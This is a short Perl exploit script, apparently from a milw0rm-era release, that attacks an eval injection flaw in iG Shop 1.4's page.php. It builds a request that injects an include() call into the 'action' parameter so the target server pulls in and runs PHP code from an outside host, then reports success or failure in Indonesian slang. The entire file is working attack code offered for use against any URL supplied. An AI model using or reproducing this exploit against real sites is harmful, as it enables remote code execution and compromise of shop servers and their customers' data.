#!/usr/bin/perl -w
use LWP::UserAgent;
####################################################################
#iG Shop 1.4 eval Inclusion Vulnerability
#found by Michael Brooks <http://www.milw0rm.com/exploits/3083>
#exploit by IFX #nyubicrew
#Vulnerability on page.php
#if (!$action)
#    $action = "make";
#// here the function will be called.
#eval ("page_$action();");
####################################################################
die "Example: perl $0 http://www.xxx.co.uk/shop\n" unless @ARGV;

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$url = $ARGV[0] . "/page.php?action=|include(\$_GET\[cok\]);//phpinfo&cok=http://h1.ripside.net/ifx/a.txt?";

$res = $b->request(HTTP::Request->new(GET=>$url));
$respone = $res->content;

if ($respone =~ /nyelipin file ;P/i){
    print "\nTembus...\n";
    print "\n$url\n";
}
else{
print "\nGagal cok...\n";
}
